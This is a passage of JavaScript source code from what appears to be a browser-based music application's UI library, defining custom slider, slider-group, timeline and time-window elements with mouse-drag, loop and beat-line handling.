		}
	}
	enable( b ) {
		this._enable = b;
		this.classList.toggle( "gsuiSlider-disable", !b );
	}

	// private:
	// .........................................................................
	_setType( type ) {
		const st = this._elLineColor.style,
			circ = type === "circular",
			axeX = type === "linear-x";

		this._circ = circ;
		this._axeX = axeX;
		this.classList.toggle( "gsuiSlider-circular", circ );
		this.classList.toggle( "gsuiSlider-linear", !circ );
		if ( !circ ) {
			if ( axeX ) {
				st.left =
				st.width = "";
				st.top = "0";
				st.height = "100%";
			} else {
				st.top =
				st.height = "";
				st.left = "0";
				st.width = "100%";
			}
		}
	}
	_setSVGcirc() {
		if ( this._circ && this.width && this.height ) {
			const size = Math.min( this.width, this.height ),
				size2 = size / 2,
				circR = ~~( ( size - this._strokeWidth ) / 2 );

			this._elSvg.setAttribute( "viewBox", `0 0 ${ size } ${ size }` );
			this._elSvgLine.setAttribute( "cx", size2 );
			this._elSvgLine.setAttribute( "cy", size2 );
			this._elSvgLine.setAttribute( "r", circR );
			this._elSvgLineColor.setAttribute( "cx", size2 );
			this._elSvgLineColor.setAttribute( "cy", size2 );
			this._elSvgLineColor.setAttribute( "r", circR );
			this._elSvgLine.style.strokeWidth =
			this._elSvgLineColor.style.strokeWidth = this._strokeWidth;
			this._svgLineLen = circR * 2 * Math.PI;
		}
	}
	_getInputVal() {
		const val = this._elInput.value;

		return Math.abs( +val ) < .000001 ? "0" : val;
	}
	_getRange() {
		return this._max - this._min;
	}
	_getMousemoveSize() {
		return this._mousemoveSize || (
			this._circ
				? this._svgLineLen
				: this._axeX
					? this._elLine.getBoundingClientRect().width
					: this._elLine.getBoundingClientRect().height
		);
	}
	_updateVal() {
		this.value = +this._getInputVal();
		if ( this._connected ) {
			const len = this._getRange(),
				prcval = ( this.value - this._min ) / len,
				prcstart = -this._min / len,
				prclen = Math.abs( prcval - prcstart ),
				prcmin = Math.min( prcval, prcstart );

			if ( this._circ ) {
				const line = this._elSvgLineColor.style;

				line.transform = `rotate(${ 90 + prcmin * 360 }deg)`;
				line.strokeDasharray = `${ prclen * this._svgLineLen }, 999999`;
			} else {
				const line = this._elLineColor.style;

				if ( this._axeX ) {
					line.left = `${ prcmin * 100 }%`;
					line.width = `${ prclen * 100 }%`;
				} else {
					line.bottom = `${ prcmin * 100 }%`;
					line.height = `${ prclen * 100 }%`;
				}
			}
		}
	}
	_onchange() {
		const val = this._getInputVal();

		if ( this._previousval !== val ) {
			this.onchange && this.onchange( +val );
			this._previousval = val;
		}
	}

	// events:
	// .........................................................................
	_wheel( e ) {
		if ( this._enable && this._wheelChange ) {
			const d = e.deltaY > 0 ? -1 : 1;

			this.setValue( +this._getInputVal() + this._scrollStep * d, true );
			return false;
		}
	}
	_mousedown() {
		if ( this._enable ) {
			this._onchange();
			if ( this.oninputstart ) {
				this.oninputstart( this.value );
			}
			this._pxval = this._getRange() / this._getMousemoveSize();
			this._pxmoved = 0;
			this.requestPointerLock();
		}
	}
	_mousemove( e ) {
		if ( this._locked ) {
			const bound = this._getRange() / 5,
				mov = this._circ || !this._axeX ? -e.movementY : e.movementX,
				val = +this._previousval + ( this._pxmoved + mov ) * this._pxval;

			if ( this._min - bound < val && val < this._max + bound ) {
				this._pxmoved += mov;
			}
			this.setValue( val, true );
		}
	}
	_mouseup() {
		if ( this._locked ) {
			document.exitPointerLock();
			this._locked = false;
			this._onchange();
			if ( this.oninputend ) {
				this.oninputend( this.value );
			}
		}
	}
	_mouseleave() {
		this._onchange();
	}
}

customElements.define( "gsui-slider", gsuiSlider );

document.addEventListener( "pointerlockchange", () => {
	const el = document.pointerLockElement;

	if ( el ) {
		if ( el.classList.contains( "gsuiSlider" ) ) {
			el._locked = true;
			gsuiSlider._focused = el;
		}
	} else if ( gsuiSlider._focused ) {
		gsuiSlider._focused._mouseup();
	}
} );

GSUI.setTemplate( "gsui-slidergroup", withBeatlines => {
	return (
		GSUI.createElement( "div", { class: "gsuiSliderGroup-slidersWrap" },
			GSUI.createElement( "div", { class: "gsuiSliderGroup-sliders" }, withBeatlines && [
				GSUI.createElement( "gsui-beatlines", { coloredbeats: "" } ),
				GSUI.createElement( "div", { class: "gsuiSliderGroup-currentTime" } ),
				GSUI.createElement( "div", { class: "gsuiSliderGroup-loop gsuiSliderGroup-loopA" } ),
				GSUI.createElement( "div", { class: "gsuiSliderGroup-loop gsuiSliderGroup-loopB" } ),
			] ),
		)
	);
} );

GSUI.setTemplate( "gsui-slidergroup-slider", () => {
	return (
		GSUI.createElement( "div", { class: "gsuiSliderGroup-slider" },
			GSUI.createElement( "div", { class: "gsuiSliderGroup-sliderInner" } ),
		)
	);
} );

class gsuiSliderGroup extends HTMLElement {
	constructor() {
		super();
		this._min =
		this._max =
		this._exp =
		this._step =
		this._pxPerBeat = 0;
		this._sliders = new Map();
		this._selected = new Map();
		this._valueSaved = new Map();
		this._bcr =
		this._evMouseup =
		this._evMousemove = null;
		this._uiFn = Object.freeze( {
			when: this._sliderWhen.bind( this ),
			value: this._sliderValue.bind( this ),
			duration: this._sliderDuration.bind( this ),
			selected: this._sliderSelected.bind( this ),
		} );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			const withBeatlines = this.hasAttribute( "beatlines" ),
				root = GSUI.getTemplate( "gsui-slidergroup", withBeatlines );

			this._connected = true;
			this.classList.add( "gsuiSliderGroup" );
			this.scrollElement = root;
			this._slidersParent = root.querySelector( ".gsuiSliderGroup-sliders" );
			if ( withBeatlines ) {
				this._uiBeatlines = root.querySelector( "gsui-beatlines" );
				this._currentTime = root.querySelector( ".gsuiSliderGroup-currentTime" );
				this._loopA = root.querySelector( ".gsuiSliderGroup-loopA" );
				this._loopB = root.querySelector( ".gsuiSliderGroup-loopB" );
			}
			this.append( root );
			this._updatePxPerBeat();
			this._slidersParent.onmousedown = this._mousedown.bind( this );
		}
	}
	static get observedAttributes() {
		return [ "timesignature", "currenttime", "loopa", "loopb" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			switch ( prop ) {
				case "currenttime":
					this._currentTime.style.left = `${ val }em`;
					break;
				case "timesignature":
					this._uiBeatlines.setAttribute( "timesignature", val );
					break;
				case "loopa":
					this._loopA.classList.toggle( "gsuiSliderGroup-loopOn", val );
					if ( val ) {
						this._loopA.style.width = `${ val }em`;
					}
					break;
				case "loopb":
					this._loopB.classList.toggle( "gsuiSliderGroup-loopOn", val );
					if ( val ) {
						this._loopB.style.left = `${ val }em`;
					}
					break;
			}
		}
	}

	// .........................................................................
	empty() {
		this._sliders.forEach( s => s.element.remove() );
		this._sliders.clear();
		this._selected.clear();
		this._valueSaved.clear();
	}
	minMaxStep( min, max, step, exp = 0 ) {
		this._min = min;
		this._max = max;
		this._step = step;
		this._exp = exp;
	}
	setPxPerBeat( px ) {
		const ppb = Math.round( Math.min( Math.max( 8, px ) ), 512 );

		if ( ppb !== this._pxPerBeat ) {
			this._pxPerBeat = ppb;
			if ( this._connected ) {
				this._updatePxPerBeat();
			}
		}
	}

	// data:
	// .........................................................................
	delete( id ) {
		this._sliders.get( id ).element.remove();
		this._sliders.delete( id );
		this._selected.delete( id );
		delete this._slidersObj;
		this._sliderSelectedClass();
	}
	set( id, when, duration, value ) {
		const element = GSUI.getTemplate( "gsui-slidergroup-slider" ),
			sli = { element };

		element._slider =
		element.firstElementChild._slider = sli;
		element.dataset.id = id;
		this._sliders.set( id, sli );
		this._sliderWhen( sli, when );
		this._sliderValue( sli, value );
		this._sliderDuration( sli, duration );
		this._slidersParent.append( element );
	}
	setProp( id, prop, value ) {
		const sli = this._sliders.get( id );

		if ( sli ) {
			sli[ prop ] = value;
			this._uiFn[ prop ]( sli, value );
		}
	}

	// private:
	// .........................................................................
	_roundVal( val ) {
		return +( Math.round( val / this._step ) * this._step ).toFixed( 8 );
	}
	_updatePxPerBeat() {
		this._slidersParent.style.fontSize = `${ this._pxPerBeat }px`;
		if ( this._uiBeatlines ) {
			this._uiBeatlines.setAttribute( "pxperbeat", this._pxPerBeat );
		}
	}
	_sliderWhen( sli, when ) {
		sli.when = when;
		sli.element.style.left = `${ when }em`;
		sli.element.style.zIndex = Math.floor( when * 100 );
	}
	_sliderDuration( sli, dur ) {
		sli.dur = dur;
		sli.element.style.width = `${ dur }em`;
	}
	_sliderSelected( sli, b ) {
		b
			? this._selected.set( sli.element.dataset.id, sli )
			: this._selected.delete( sli.element.dataset.id );
		sli.element.classList.toggle( "gsuiSliderGroup-sliderSelected", !!b );
		this._sliderSelectedClass();
	}
	_sliderSelectedClass() {
		this._slidersParent.classList.toggle(
			"gsuiSliderGroup-slidersSelected", this._selected.size > 0 );
	}
	_sliderValue( sli, val ) {
		const el = sli.element.firstElementChild,
			st = el.style,
			max = this._max,
			min = this._min,
			rval = this._roundVal( val ),
			valUp = rval >= 0,
			perc0 = Math.abs( min ) / ( max - min ) * 100,
			percX = Math.abs( rval ) / ( max - min ) * 100;

		sli.value = rval;
		st.height = `${ percX }%`;
		st[ valUp ? "top" : "bottom" ] = "auto";
		st[ valUp ? "bottom" : "top" ] = `${ perc0 }%`;
		el.classList.toggle( "gsuiSliderGroup-sliderInnerDown", !valUp );
	}

	// events:
	// .........................................................................
	_mousedown( e ) {
		if ( !this._evMouseup ) {
			const bcr = this._slidersParent.getBoundingClientRect();

			this._bcr = bcr;
			this._valueSaved.clear();
			this._sliders.forEach( ( sli, id ) => this._valueSaved.set( id, sli.value ) );
			this._evMouseup = this._mouseup.bind( this );
			this._evMousemove = this._mousemove.bind( this );
			document.addEventListener( "mouseup", this._evMouseup );
			document.addEventListener( "mousemove", this._evMousemove );
			window.getSelection().removeAllRanges();
			GSUI.dragshield.show( "pointer" );
			this._mousemove( e );
		}
	}
	_mousemove( e ) {
		const sliders = this._selected.size > 0
				? this._selected
				: this._sliders,
			x = e.pageX - this._bcr.left,
			y = e.pageY - this._bcr.top,
			xval = x / this._pxPerBeat,
			yval = Math.min( Math.max( 0, 1 - y / this._bcr.height ), 1 ),
			rval = this._roundVal( yval * ( this._max - this._min ) + this._min );
		let firstWhen = 0;

		sliders.forEach( sli => {
			if ( sli.when <= xval && firstWhen <= xval ) {
				firstWhen = sli.when;
			}
		} );
		sliders.forEach( sli => {
			if ( firstWhen <= sli.when && sli.when <= xval && xval <= sli.when + sli.dur ) {
				this._sliderValue( sli, rval );
				GSUI.dispatchEvent( this, "gsuiSliderGroup", "input", sli.element.dataset.id, rval );
			}
		} );
	}
	_mouseup() {
		const arr = [];

		GSUI.dragshield.hide();
		document.removeEventListener( "mouseup", this._evMouseup );
		document.removeEventListener( "mousemove", this._evMousemove );
		this._evMouseup =
		this._evMousemove = null;
		this._sliders.forEach( ( sli, id ) => {
			if ( sli.value !== this._valueSaved.get( id ) ) {
				arr.push( [ id, sli.value ] );
			}
		} );
		if ( arr.length ) {
			GSUI.dispatchEvent( this, "gsuiSliderGroup", "change", arr );
		}
		GSUI.dispatchEvent( this, "gsuiSliderGroup", "inputEnd" );
	}
}

customElements.define( "gsui-slidergroup", gsuiSliderGroup );

GSUI.setTemplate( "gsui-timeline", () => [
	GSUI.createElement( "div", { class: "gsuiTimeline-steps" } ),
	GSUI.createElement( "div", { class: "gsuiTimeline-beats" } ),
	GSUI.createElement( "div", { class: "gsuiTimeline-loopLine" },
		GSUI.createElement( "div", { class: "gsuiTimeline-loop" },
			GSUI.createElement( "div", { class: "gsuiTimeline-loopBody" } ),
			GSUI.createElement( "div", { class: "gsuiTimeline-loopHandle gsuiTimeline-loopHandleA" } ),
			GSUI.createElement( "div", { class: "gsuiTimeline-loopBorder gsuiTimeline-loopBorderA" } ),
			GSUI.createElement( "div", { class: "gsuiTimeline-loopHandle gsuiTimeline-loopHandleB" } ),
			GSUI.createElement( "div", { class: "gsuiTimeline-loopBorder gsuiTimeline-loopBorderB" } ),
		),
	),
	GSUI.createElement( "div", { class: "gsuiTimeline-timeLine" },
		GSUI.createElementNS( "svg", { class: "gsuiTimeline-cursor", width: "16", height: "10" },
			GSUI.createElementNS( "polygon", { points: "2,2 8,8 14,2" } ),
		),
		GSUI.createElementNS( "svg", { class: "gsuiTimeline-cursorPreview", width: "16", height: "10" },
			GSUI.createElementNS( "polygon", { points: "2,2 8,8 14,2" } ),
		),
	),
] );

class gsuiTimeline extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-timeline" ),
			elTimeLine = children[ 3 ];

		super();
		this._children = children;
		this.beatsPerMeasure = 4;
		this.stepsPerBeat = 4;
		this.pxPerBeat = 10;
		this.loopA =
		this.loopB = 0;
		this.looping = false;
		this._step = 1;
		this._onscroll = this._onscroll.bind( this );
		this._scrollingAncestor = null;
		this._elSteps = children[ 0 ];
		this._elBeats = children[ 1 ];
		this._elLoop = children[ 2 ].firstChild;
		this._elTimeLine = elTimeLine;
		this._elCursor = elTimeLine.firstChild;
		this._elCursorPreview = elTimeLine.lastChild;
		this._offset = null;
		this._mousedownDate =
		this._mousemoveBeat =
		this._mousedownBeat =
		this._mousedownLoopA =
		this._mousedownLoopB = 0;
		this._mousedownLoop = "";
		this._onlyMeasures = false;
		this._onmousemove = this._onmousemove.bind( this );
		this._onmouseup = this._onmouseup.bind( this );
		this._status = "";
		this._dispatch = GSUI.dispatchEvent.bind( null, this, "gsuiTimeline" );
		this._onresize = this._onresize.bind( this );
		Object.seal( this );

		this._elCursorPreview.remove();
		this.onmousedown = this._onmousedown.bind( this );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiTimeline" );
			this.append( ...this._children );
			this._children = null;
			if ( !this.hasAttribute( "step" ) ) {
				this.setAttribute( "step", 1 );
			}
		}
		this._scrollingAncestor = this._closestScrollingAncestor( this.parentNode );
		this._scrollingAncestor.addEventListener( "scroll", this._onscroll );
		GSUI.observeSizeOf( this._scrollingAncestor, this._onresize );
		this._updateOffset();
		this._updateNumberBeats();
		this._updateMeasures();
	}
	disconnectedCallback() {
		this._scrollingAncestor.removeEventListener( "scroll", this._onscroll );
		GSUI.unobserveSizeOf( this._scrollingAncestor, this._onresize );
	}
	static get observedAttributes() {
		return [ "step", "timesignature", "pxperbeat", "loop", "currenttime", "currenttime-preview" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			switch ( prop ) {
				case "step": this._step = +val; break;
				case "loop": this._changeLoop( val ); break;
				case "pxperbeat": this._changePxPerBeat( +val ); break;
				case "currenttime": this._changeCurrentTime( +val ); break;
				case "timesignature": this._changeTimesignature( val ); break;
				case "currenttime-preview": this._changeCurrentTimePreview( val ); break;
			}
		}
	}

	// .........................................................................
	previewCurrentTime( b ) { // to remove...
		const ret = b !== false
				? this.beatRound( b )
				: +this.getAttribute( "currenttime-preview" ) || +this.getAttribute( "currenttime" ) || 0;

		b !== false
			? this.setAttribute( "currenttime-preview", ret )
			: this.removeAttribute( "currenttime-preview" );
		return ret;
	}
	_changePxPerBeat( ppb ) {
		const stepsOpa = Math.max( 0, Math.min( ( ppb - 32 ) / 256, .5 ) ),
			beatsOpa = Math.max( 0, Math.min( ( ppb - 20 ) / 40, .5 ) ),
			onlyM = ppb < 20;

		this.pxPerBeat = ppb;
		this._onlyMeasures = onlyM;
		this.style.fontSize = `${ ppb }px`;
		this.style.setProperty( "--gsuiTimeline-beats-incr", onlyM ? this.beatsPerMeasure : 1 );
		this.style.setProperty( "--gsuiTimeline-beats-opacity", beatsOpa );
		this._elSteps.style.opacity = stepsOpa;
		if ( this._scrollingAncestor ) {
			this._updateOffset();
			this._updateNumberBeats();
			this._updateMeasures();
		}
	}
	_changeTimesignature( val ) {
		const ts = val.split( "," );

		this.beatsPerMeasure = +ts[ 0 ];
		this.stepsPerBeat = +ts[ 1 ];
		this._updateStepsBg();
		this._updateMeasures();
	}
	_changeLoop( val ) {
		const [ a, b ] = ( val || "0-0" ).split( "-" );

		this.looping = !!val;
		this.loopA = +a;
		this.loopB = +b;
		this._updateLoop();
	}
	_changeCurrentTime( t ) {
		this._elCursor.style.left = `${ t }em`;
	}
	_changeCurrentTimePreview( t ) {
		if ( !t ) {
			this._elCursorPreview.remove();
		} else {
			this._elCursorPreview.style.left = `${ t }em`;
			if ( !this._elCursorPreview.parentNode ) {
				this._elTimeLine.append( this._elCursorPreview );
			}
		}
	}

	// .........................................................................
	beatCeil( beat ) { return this._beatCalc( Math.ceil, beat ); }
	beatRound( beat ) { return this._beatCalc( Math.round, beat ); }
	beatFloor( beat ) { return this._beatCalc( Math.floor, beat ); }
	_beatCalc( mathFn, beat ) {
		const mod = 1 / this.stepsPerBeat * this._step;

		return mathFn( beat / mod ) * mod;
	}

	// .........................................................................
	_closestScrollingAncestor( el ) {
		const ov = getComputedStyle( el ).overflowX;

		return ov === "auto" || ov === "scroll" || el === document.body
			? el
			: this._closestScrollingAncestor( el.parentNode );
	}
	_setStatus( st ) {
		this.classList.remove( `gsuiTimeline-${ this._status }` );
		this.classList.toggle( `gsuiTimeline-${ st }`, !!st );
		this._status = st;
	}
	_getBeatByPageX( pageX ) {
		const bcrX = this._elTimeLine.getBoundingClientRect().x;

		return Math.max( 0, this.beatRound( ( pageX - bcrX ) / this.pxPerBeat ) );
	}
	_updateStepsBg() {
		const sPB = this.stepsPerBeat,
			dots = [];

		for ( let i = 1; i < sPB; ++i ) {
			if ( i > 1 ) {
				dots.push( `transparent calc( ${ ( i - 1 ) / sPB }em + 1px )` );
			}
			dots.push(
				`transparent calc( ${ i / sPB }em - 1px )`,
				`currentColor calc( ${ i / sPB }em - 1px )`,
				`currentColor calc( ${ i / sPB }em + 1px )` );
		}
		this._elSteps.style.backgroundImage = `
			repeating-linear-gradient(90deg, transparent 0em,
				${ dots.join( "," ) },
				transparent calc( ${ ( sPB - 1 ) / sPB }em + 1px ), transparent calc( ${ 1 }em )
			)
		`;
	}
	_updateOffset() {
		const offBeats = Math.floor( this._scrollingAncestor.scrollLeft / this.pxPerBeat ),
			off = this._onlyMeasures
				? Math.floor( offBeats / this.beatsPerMeasure ) * this.beatsPerMeasure
				: offBeats,
			diff = off !== this._offset;

		if ( diff ) {
			this._offset = off;
			this.style.setProperty( "--gsuiTimeline-beats-offset", off );
		}
		return diff;
	}
	_updateNumberBeats() {
		const elBeats = this._elBeats,
			px = this.pxPerBeat * ( this._onlyMeasures ? this.beatsPerMeasure : 1 ),
			nb = Math.ceil( this._scrollingAncestor.clientWidth / px ) + 1;

		if ( nb < 0 || nb > 500 ) {
			return console.warn( "gsuiTimeline: anormal number of nodes to create", nb );
		} else if ( elBeats.children.length > nb ) {
			while ( elBeats.children.length > nb ) {
				elBeats.lastChild.remove();
			}
		} else {
			while ( elBeats.children.length < nb ) {
				elBeats.append( GSUI.createElement( "span", { class: "gsuiTimeline-beat" } ) );
			}
		}
	}
	_updateMeasures() {
		Array.prototype.forEach.call( this._elBeats.children, ( el, i ) => {
			el.classList.toggle( "gsuiTimeline-measure",
				this._onlyMeasures || ( this._offset + i ) % this.beatsPerMeasure === 0 );
		} );
	}
	_updateLoop() {
		this.classList.toggle( "gsuiTimeline-looping", this.looping );
		if ( this.looping ) {
			this._elLoop.style.left = `${ this.loopA }em`;
			this._elLoop.style.width = `${ this.loopB - this.loopA }em`;
		}
	}

	// .........................................................................
	_onscroll() {
		if ( this._updateOffset() && !this._onlyMeasures ) {
			this._updateMeasures();
		}
	}
	_onresize() {
		this._updateNumberBeats();
		this._updateMeasures();
	}
	_onmousedown( e ) {
		const loopLine = e.target.classList.contains( "gsuiTimeline-loopLine" );

		if ( loopLine && Date.now() - this._mousedownDate > 500 ) {
			this._mousedownDate = Date.now();
		} else {
			this._setStatus(
				e.target === this._elCursor.parentNode ? "draggingTime" :
				e.target.classList.contains( "gsuiTimeline-loopBody" ) ? "draggingLoopBody" :
				e.target.classList.contains( "gsuiTimeline-loopHandleA" ) ? "draggingLoopHandleA" :
				e.target.classList.contains( "gsuiTimeline-loopHandleB" ) || loopLine ? "draggingLoopHandleB" : "" );
			if ( this._status ) {
				this._mousemoveBeat = null;
				this._mousedownBeat = this._getBeatByPageX( e.pageX );
				if ( loopLine ) {
					this.loopA =
					this.loopB = this._mousedownBeat;
					this._dispatch( "inputLoopStart" );
				} else {
					this._dispatch( "inputCurrentTimeStart" );
				}
				this._mousedownLoop = this.getAttribute( "loop" );
				this._mousedownLoopA = this.loopA;
				this._mousedownLoopB = this.loopB;
				document.addEventListener( "mousemove", this._onmousemove );
				document.addEventListener( "mouseup", this._onmouseup );
				GSUI.unselectText();
				this._onmousemove( e );
			}
		}
	}
	_onmousemove( e ) {
		const beat = this._getBeatByPageX( e.pageX ),
			beatRel = beat - this._mousedownBeat;

		if ( beatRel !== this._mousemoveBeat ) {
			this._mousemoveBeat = beatRel;
			switch ( this._status ) {
				case "draggingTime":
					this.setAttribute( "currenttime-preview", beat );
					this._dispatch( "inputCurrentTime", beat );
					break;
				case "draggingLoopBody": {
					const rel = Math.max( -this._mousedownLoopA, beatRel ),
						a = this._mousedownLoopA + rel,
						b = this._mousedownLoopB + rel,
						loop = `${ a }-${ b }`;

					if ( loop !== this.getAttribute( "loop" ) ) {
						this.setAttribute( "loop", loop );
						this._dispatch( "inputLoop", a, b );
					}
				} break;
				case "draggingLoopHandleA":
				case "draggingLoopHandleB": {
					const handA = this._status === "draggingLoopHandleA",
						rel = handA
							? Math.max( -this._mousedownLoopA, beatRel )
							: beatRel,
						a = this._mousedownLoopA + ( handA ? rel : 0 ),
						b = this._mousedownLoopB + ( handA ? 0 : rel ),
						aa = Math.min( a, b ),
						bb = Math.max( a, b ),
						loop = `${ aa }-${ bb }`;

					if ( a > b ) {
						if ( handA ) {
							this._setStatus( "draggingLoopHandleB" );
							this._mousedownLoopA = this._mousedownLoopB;
						} else {
							this._setStatus( "draggingLoopHandleA" );
							this._mousedownLoopB = this._mousedownLoopA;
						}
						this._mousedownBeat = this._mousedownLoopA;
					}
					if ( loop !== this.getAttribute( "loop" ) ) {
						if ( aa !== bb ) {
							this.setAttribute( "loop", loop );
							this._dispatch( "inputLoop", aa, bb );
						} else if ( this.hasAttribute( "loop" ) ) {
							this.removeAttribute( "loop" );
							this._dispatch( "inputLoop", false );
						}
					}
				} break;
			}
		}
	}
	_onmouseup() {
		document.removeEventListener( "mousemove", this._onmousemove );
		document.removeEventListener( "mouseup", this._onmouseup );
		switch ( this._status ) {
			case "draggingTime": {
				const beat = this.getAttribute( "currenttime-preview" );

				this.removeAttribute( "currenttime-preview" );
				this._dispatch( "inputCurrentTimeEnd" );
				if ( beat !== this.getAttribute( "currenttime" ) ) {
					this.setAttribute( "currenttime", beat );
					this._dispatch( "changeCurrentTime", +beat );
				}
			} break;
			case "draggingLoopBody":
			case "draggingLoopHandleA":
			case "draggingLoopHandleB":
				this._dispatch( "inputLoopEnd" );
				if ( this.getAttribute( "loop" ) !== this._mousedownLoop ) {
					if ( this.loopA !== this.loopB ) {
						this._dispatch( "changeLoop", this.loopA, this.loopB );
					} else {
						this.removeAttribute( "loop" );
						this._dispatch( "changeLoop", false );
					}
				}
				break;
		}
		this._setStatus( "" );
	}
}

customElements.define( "gsui-timeline", gsuiTimeline );

GSUI.setTemplate( "gsui-timewindow", () => [
	GSUI.createElement( "div", { class: "gsuiTimewindow-panel" },
		GSUI.createElement( "div", { class: "gsuiTimewindow-panelUp" },
			GSUI.createElement( "button", { class: "gsuiTimewindow-step" },
				GSUI.createElement( "span", { class: "gsuiTimewindow-stepValue" } ),
				GSUI.createElement( "i", { class: "gsuiIcon", "data-icon": "magnet" } ),
			),
		),
		GSUI.createElement( "div", { class: "gsuiTimewindow-panelContent" } ),
		GSUI.createElement( "div", { class: "gsuiTimewindow-panelContentDown" },
			GSUI.createElement( "div", { class: "gsuiTimewindow-panelExtend gsuiTimewindow-panelExtendX" } ),
		),
		GSUI.createElement( "div", { class: "gsuiTimewindow-panelExtend gsuiTimewindow-panelExtendY" } ),
	),
	GSUI.createElement( "div", { class: "gsuiTimewindow-main" },
		GSUI.createElement( "div", { class: "gsuiTimewindow-time" },
			GSUI.createElement( "gsui-timeline" ),
		),
		GSUI.createElement( "div", { class: "gsuiTimewindow-mainBody" },
			GSUI.createElement( "div", { class: "gsuiTimewindow-mainContent" },
				GSUI.createElement( "gsui-beatlines", { coloredbeats: "" } ),
				GSUI.createElement( "div", { class: "gsuiTimewindow-currentTime" } ),
				GSUI.createElement( "div", { class: "gsuiTimewindow-loop gsuiTimewindow-loopA" } ),
				GSUI.createElement( "div", { class: "gsuiTimewindow-loop gsuiTimewindow-loopB" } ),
				GSUI.createElement( "div", { class: "gsuiTimewindow-rows" } ),
			),
		),
		GSUI.createElement( "div", { class: "gsuiTimewindow-contentDown" },
			GSUI.createElement( "div", { class: "gsuiTimewindow-panelExtend gsuiTimewindow-panelExtendX" } ),
		),
	),
] );

class gsuiTimewindow extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-timewindow" ),
			elPanel = children[ 0 ],
			elMain = children[ 1 ];

		super();
		this._children = children;
		this._elPanel = elPanel;
		this._elStepBtn = elPanel.querySelector( ".gsuiTimewindow-step" );
		this._elPanelDown = elPanel.querySelector( ".gsuiTimewindow-panelContentDown" );
		this._elTimeline = elMain.querySelector( "gsui-timeline" );
		this._elBeatlines = elMain.querySelector( "gsui-beatlines" );
		this._elCurrentTime = elMain.querySelector( ".gsuiTimewindow-currentTime" );
		this._elLoopA = elMain.querySelector( ".gsuiTimewindow-loopA" );
		this._elLoopB = elMain.querySelector( ".gsuiTimewindow-loopB" );
		this._elDown = elMain.querySelector( ".gsuiTimewindow-contentDown" );
		this._pxPerBeat =
		this._panelSize =
		this._lineHeight =
		this._mousedownPageX =
		this._mousedownPageY = 0;
		this._onmousemoveExtendPanel = this._onmousemoveExtendPanel.bind( this );
		this._onmousemoveExtendDownPanel = this._onmousemoveExtendDownPanel.bind( this );
		this._onmouseupExtend = this._onmouseupExtend.bind( this );
		Object.seal( this );

		this.addEventListener( "gsuiEvents", this._ongsuiEvents.bind( this ) );
		this.ondragstart = () => false;
		elMain.onwheel = this._onwheel.bind( this );
		this._elStepBtn.onclick = this._onclickStep.bind( this );
		elMain.querySelector( ".gsuiTimewindow-mainContent" ).oncontextmenu = e => e.preventDefault();
		elPanel.querySelector( ".gsuiTimewindow-panelContent" ).onwheel = this._onwheelPanel.bind( this );
		elPanel.querySelector( ".gsuiTimewindow-panelExtendY" ).onmousedown = this._onmousedownExtend.bind( this, "side" );
	}

	// .........................................................................
	connectedCallback() {
		if ( !this.firstChild ) {
			this.classList.add( "gsuiTimewindow" );
			this._elPanel.style.minWidth = `${ this.getAttribute( "panelsize" ) || 100 }px`;
			this.append( ...this._children );
			if ( this.hasAttribute( "downpanel" ) ) {
				this._elPanelDown.firstChild.onmousedown =
				this._elDown.firstChild.onmousedown = this._onmousedownExtend.bind( this, "down" );
				this._elPanelDown.style.height =
				this._elDown.style.height = `${ this.getAttribute( "downpanelsize" ) || 50 }px`;
			} else {
				this._elPanelDown.remove();
				this._elDown.remove();
			}
			this._children = null;
			if ( !this.hasAttribute( "step" ) ) {
				this.setAttribute( "step", 1 );
			}
			if ( !this.hasAttribute( "pxperbeat" ) ) {
				this.setAttribute( "pxperbeat", 100 );
			}
			if ( !this.hasAttribute( "lineheight" ) ) {
				this.setAttribute( "lineheight", 48 );
			}
		}
	}
	static get observedAttributes() {
		return [ "step", "timesignature", "pxperbeat", "lineheight", "currenttime", "loop" ];
	}
	attributeChangedCallback( prop, prev, val ) {
		if ( prev !== val ) {
			switch ( prop ) {
				case "step":
					this._elTimeline.setAttribute( "step", val );
					this._elStepBtn.firstChild.textContent = this._convertStepToFrac( +val );
					break;
				case "timesignature":
					this._elTimeline.setAttribute( "timesignature", val );
					this._elBeatlines.setAttribute( "timesignature", val );
					break;
				case "pxperbeat":
					this._pxPerBeat = +val;
					this._elTimeline.setAttribute( "pxperbeat", val );
					this._elBeatlines.setAttribute( "pxperbeat", val );
					this.style.setProperty( "--gsuiTimewindow-pxperbeat", `${ val }px` );
					this._elCurrentTime.style.fontSize =
					this._elLoopA.style.fontSize =
					this._elLoopB.style.fontSize = `${ val }px`;
					break;
				case "lineheight":
					this._lineHeight = +val;
					this.style.setProperty( "--gsuiTimewindow-lineH", `${ val }px` );
					break;
				case "currenttime": {
					const step = +this.getAttribute( "currenttimestep" );

					this._elTimeline.setAttribute( "currenttime", val );
					if ( step ) {
						this._elCurrentTime.style.left = `${ ( val / step | 0 ) * step }em`;
					} else {
						this._elCurrentTime.style.left = `${ val }em`;
					}
				} break;
				case "loop":
					if ( val ) {
						const [ a, b ] = val.split( "-" );

						this.classList.add( "gsuiTimewindow-looping" );
						this._elTimeline.setAttribute( "loop", val );
						this._elLoopA.style.width = `${ a }em`;
						this._elLoopB.style.left = `${ b }em`;
					} else {
						this.classList.remove( "gsuiTimewindow-looping" );
						this._elTimeline.removeAttribute( "loop" );
					}
					break;
			}
		}
	}

	// .........................................................................
	_convertStepToFrac( step ) {
		return (
			step >= 1 ? "1" :
			step >= .5 ? "1 / 2" :
			step >= .25 ? "1 / 4" : "1 / 8"
		);
	}

	// .........................................................................
	_ongsuiEvents( e ) {
		const d = e.detail;

		switch ( d.component ) {
			case "gsuiTimeline": {
				const [ a, b ] = d.args;

				switch ( d.eventName ) {
					case "changeCurrentTime":
						this.setAttribute( "currenttime", a );
						break;
					case "inputCurrentTime":
						e.stopPropagation();
						break;
					case "inputLoop":
						GSUI.setAttribute( this, "loop", Number.isFinite( a ) && `${ a }-${ b }` );
						break;
					case "inputLoopStart":
					case "inputCurrentTimeStart":
						this.style.overflowY = "hidden";
						e.stopPropagation();
						break;
					case "inputLoopEnd":
					case "inputCurrentTimeEnd":
						this.style.overflowY = "";
						e.stopPropagation();
						break;
				}
